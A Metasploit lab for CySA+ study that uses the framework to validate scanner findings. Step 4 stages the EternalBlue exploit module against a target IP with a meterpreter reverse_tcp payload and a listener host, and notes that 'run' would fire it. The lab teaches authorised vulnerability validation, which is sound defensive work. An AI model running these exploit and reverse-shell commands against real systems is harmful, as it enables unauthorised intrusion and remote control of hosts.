# Lab 15 — Metasploit Framework Basics

In this lab you will use the **Metasploit Framework (MSF)** as an analyst — not to break systems but to **validate** that a vulnerability scanner finding is actually exploitable, which is the heart of CySA+ 2.3 (Validation — true positive/negative, Exploitability/weaponization) and 2.2 (Multipurpose — MSF, Nmap, Recon-ng).

> **Ethics:** Only run exploits against systems you own or have explicit written permission to test. The free **Metasploitable 2/3** VM (https://github.com/rapid7/metasploitable3) is the standard legal target.

Run on the Killercoda Ubuntu Playground:
https://killercoda.com/playgrounds/scenario/ubuntu

---

## Step 1 — Install Metasploit Framework

```bash
apt update && apt install -y metasploit-framework
msfdb init
```

`msfdb init` sets up the Postgres backend so search and host tracking work.

---

## Step 2 — Launch the console

```bash
msfconsole -q
```

`-q` skips the banner. You are now at the `msf6 >` prompt.

---

## Step 3 — Search for an exploit

Imagine your OpenVAS report flagged **EternalBlue (CVE-2017-0144)** on a Windows host. In `msfconsole`:

```
msf6 > search eternalblue
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

`search` shows every matching module. `info` displays required options, payloads, targets, and references — including the CVE.

---

## Step 4 — Configure and stage (do not run — analyst view)

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 10.10.10.10
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.10.10.99
msf6 exploit(...) > check
```

`check` is the safe analyst command: it probes the target and reports vulnerable / not vulnerable **without** firing the exploit. This is how you turn a scanner "high" into a confirmed true positive.

To actually exploit (only on Metasploitable), you would `run` — but the validation is what CySA+ tests.

---

## Step 5 — Use an auxiliary scanner instead of an exploit

Many MSF modules are non-destructive scanners:

```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.56.0/24
msf6 auxiliary(smb_ms17_010) > run
```

This sweeps a /24 and reports which hosts are vulnerable — perfect for verifying scanner findings at scale.

---

## Step 6 — Browse useful module families

```
msf6 > search type:auxiliary scanner
msf6 > search type:post platform:windows
msf6 > search cve:2024
```

| Family | Purpose |
|---|---|
| `exploit/` | Active code-execution modules |
| `auxiliary/scanner/` | Vulnerability / version checks |
| `auxiliary/dos/` | Denial-of-service tests (rarely run in prod) |
| `post/` | Post-exploitation (only after a session exists) |
| `payload/` | The shellcode delivered by an exploit |
| `encoder/` | AV-bypass transformations |

---

## Step 7 — Workspaces and reporting

```
msf6 > workspace -a customer_x
msf6 > db_nmap -sV 192.168.56.0/24
msf6 > hosts
msf6 > services
msf6 > vulns
```

`db_nmap` runs Nmap and stores results in the Postgres DB. `hosts`, `services`, and `vulns` query that DB — ready to export for the report (Lab 26):

```
msf6 > db_export -f xml /tmp/msf_report.xml
```

---

## Step 8 — Map MSF activity to CySA+ exploitability/weaponization

| Stage | MSF feature | CySA+ 2.3 vocab |
|---|---|---|
| Will it run? | `check` command | Validation — true positive |
| Public exploit exists | module in `exploit/` tree | Weaponization |
| Reliability | `Rank: Excellent/Good` | Exploitability |
| Real-world abuse | references in `info` | Asset value × likelihood |

---

## Step 9 — Exit cleanly

```
msf6 > exit
```

---

## What you learned
- Install Metasploit and search for an exploit by name or CVE.
- Configure a module, set RHOST/LHOST/PAYLOAD, and run a non-destructive `check`.
- Use auxiliary scanners to validate scanner findings at scale.
- Persist findings via the MSF database and export them.
